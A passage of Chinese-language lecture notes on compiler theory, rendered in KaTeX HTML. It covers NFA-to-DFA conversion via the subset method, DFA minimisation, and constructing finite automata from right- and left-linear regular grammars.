class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:⊆</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span></span></span></span></eq>，非空终止状态集合</li></ul></li></ul><p>如果两个有穷自动机<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">A_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>和<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">A_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>满足<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo stretchy="false">(</mo><msub><mi>A</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mi>L</mi><mo stretchy="false">(</mo><msub><mi>A</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">L(A_1)=L(A_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq>，则称有穷状态自动机<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">A_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>和<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">A_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>是等价的</p><h3 id="3-nfa%E5%88%B0dfa%E7%9A%84%E8%BD%AC%E6%8D%A2" tabindex="-1">3 NFA到DFA的转换</h3><h4 id="nfa%E7%9A%84%E7%A1%AE%E5%AE%9A%E5%8C%96" tabindex="-1">NFA的确定化</h4><ul><li>基本思想：将状态间的转换关系映射成状态子集间的转换关系</li><li>方法：子集法，造表法</li><li>NFA存在的问题<ul><li><ol><li>开始状态的不确定</li></ol></li><li><ol start="2"><li>状态转换的不确定</li></ol></li><li><ol start="3"><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></eq>的存在的不确定性</li></ol></li></ul></li></ul><ol><li>状态子集<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span></eq>的<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></eq>闭包:从一个结点出发，经过任意<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></eq>边所能到达集合</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mi>a</mi></msub></mrow><annotation encoding="application/x-tex">I_a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>子集：由<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span></eq>的状态出发，经过一条<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span></eq>弧，(跳过<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span></eq>弧前的任意<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></eq>弧)可到达的状态的集合称为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>J</mi></mrow><annotation encoding="application/x-tex">J</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.09618em;">J</span></span></span></span></eq>,则<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mi>a</mi></msub><mo>=</mo><mi>ϵ</mi><mo>−</mo><mi>C</mi><mi>L</mi><mi>O</mi><mi>S</mi><mi>U</mi><mi>R</mi><mi>E</mi><mo stretchy="false">(</mo><mi>J</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I_a=\epsilon-CLOSURE(J)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">ϵ</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.05764em;">OS</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord mathnormal" style="margin-right:0.05764em;">RE</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.09618em;">J</span><span class="mclose">)</span></span></span></span></eq></li><li>利用子集法构造确定地有穷自动机DFA</li></ol><p><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/%E5%AD%90%E9%9B%86%E6%B3%95.jpg" alt="子集法"><br>举例：<br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/%E5%AD%90%E9%9B%86%E6%B3%95%E4%BE%8B%E5%AD%901.jpg" alt><br><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/%E5%AD%90%E9%9B%86%E6%B3%95%E4%BE%8B%E5%AD%902.jpg" alt></p><h4 id="dfa%E7%9A%84%E6%9C%80%E5%B0%8F%E5%8C%96" tabindex="-1">DFA的最小化</h4><ul><li><p>寻找一个状态数不比<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span></eq>更多的<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi><mi>F</mi><mi>A</mi><mi>M</mi><mtext>ˊ</mtext></mrow><annotation encoding="application/x-tex">DFA Mˊ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord">ˊ</span></span></span></span></eq>，使得<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span></eq>和<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mtext>ˊ</mtext></mrow><annotation encoding="application/x-tex">Mˊ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord">ˊ</span></span></span></span></eq>所识别的符号串相同，即<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo stretchy="false">(</mo><mi>M</mi><mo stretchy="false">)</mo><mo>=</mo><mi>L</mi><mo stretchy="false">(</mo><mi>M</mi><mtext>ˊ</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">L(M)=L(Mˊ)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord">ˊ</span><span class="mclose">)</span></span></span></span></eq>。</p><ul><li><ol><li>构造状态集的划分</li></ol></li><li><ol start="2"><li>取每一组中的一个状态作代表</li></ol></li><li><ol start="3"><li>删去多余死状态</li></ol></li></ul></li><li><p>DFA最小化的关键在于把它的状态集分成一些两两互不相交的子集，使得任何两个不同的子集中的状态都是可区别的，而同一子集中的任何两个状态都是等价的。</p></li><li><p>基本思想：如果从状态 p 出发能识别某一符号串 α 而停止于终态，那么从q 出发也能识别 α 而停止于终态；反之亦然。则称状态p 和 q 是等价的。如果 p 和 q 不等价，则说 p 和 q 是可区分的。</p></li><li><p>具体方法：</p><ul><li>对已有划分的每个子集进行如下分解，直到不再有新子集产生<ul><li>分解后的两个状态 p 和 q 属于同一个子集，当且仅当<eq><span class="katex-error" title="ParseError: KaTeX parse error: Can&#x27;t use function &#x27;$1#x27; in math mode at position 20: …all a \in \sum $̲，" style="color:#cc0000">\forall a \in \sum $，</span></eq>t( p, a )<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>和</mtext></mrow><annotation encoding="application/x-tex">和</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">和</span></span></span></span></eq>t( q, a )$都到达当前划分的同一子集中</li></ul></li><li><ol><li>构造状态集的划分(初次划分为终点节点和其它节点)</li></ol></li><li><ol start="2"><li>取每一组中的一个状态作代表</li></ol></li><li><ol start="3"><li>删去多余死状态</li></ol></li></ul></li></ul><p><img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/DFA%E5%8C%96%E7%AE%80%E4%BE%8B%E5%AD%90.jpg" alt="DFA化简例子"></p><h3 id="4-%E6%AD%A3%E8%A7%84%E6%96%87%E6%B3%95%E4%B8%8Efa" tabindex="-1">4 正规文法与FA</h3><ul><li>右线性正规文法构造等价<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">FA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal">A</span></span></span></span></eq><ul><li>令<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span></eq>的终结符号集为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span></eq>的字母表；</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span></eq>的非终结符号作为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span></eq>的状态，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span></eq>的开始符号为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span></eq>的开始状态；</li><li>增加一个终止状态<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Z</mi><mo stretchy="false">(</mo><mi>Z</mi><mo mathvariant="normal">∉</mo><msub><mi>V</mi><mi>N</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Z(Z\notin V_N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mord"><span class="mrel">∈</span></span><span class="mord vbox"><span class="thinbox"><span class="llap"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="inner"><span class="mord"><span class="mord">/</span><span class="mspace" style="margin-right:0.0556em;"></span></span></span><span class="fix"></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq></li><li>形如<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi><mo>→</mo><mi>a</mi><mi>W</mi></mrow><annotation encoding="application/x-tex">U→aW</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">aW</span></span></span></span></eq>的规则，引一条从状态<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi></mrow><annotation encoding="application/x-tex">U</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span></span></span></span></eq>到<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>W</mi></mrow><annotation encoding="application/x-tex">W</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span></span></span></span></eq>的<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span></eq>弧。</li><li>形如<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi><mo>→</mo><mi>a</mi></mrow><annotation encoding="application/x-tex">U→a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span></eq>的规则，引一条从状态<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi></mrow><annotation encoding="application/x-tex">U</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span></span></span></span></eq>到终止状态<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Z</mi></mrow><annotation encoding="application/x-tex">Z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span></eq>的标记为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span></eq>的弧；</li><li>例子：<img src="/images/%E6%9C%AC%E7%A7%91/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AF%BE%E7%A8%8B/%E5%8F%B3%E7%BA%BF%E6%80%A7%E6%AD%A3%E8%A7%84%E6%96%87%E6%B3%95%E5%88%B0FA.jpg" alt="右线性正规文法到FA"></li></ul></li><li>左线性正规文法构造等价<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>A</mi></mrow><annotation encoding="application/x-tex">FA</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal">A</span></span></span></span></eq><ul><li>令<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span></eq>的终结符号集为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span></eq>的字母表；</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span></eq>的非终结符号作为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span></eq>的状态，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span></eq>的开始符号为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span></eq>的终止状态；</li><li>增加一个开始状态<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo mathvariant="normal">∉</mo><msub><mi>V</mi><mi>N</mi></msub></mrow><annotation encoding="application/x-tex">S\notin V_N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mord"><span class="mrel">∈</span></span><span class="mord vbox"><span class="thinbox"><span class="llap"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="inner"><span class="mord"><span class="mord">/</span><span class="mspace" style="margin-right:0.0556em;"></span></span></span><span class="fix"></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq></li><li>形如<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi><mo>→</mo><mi>W</mi><mi>a</mi></mrow><annotation encoding="application/x-tex">U→Wa</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord 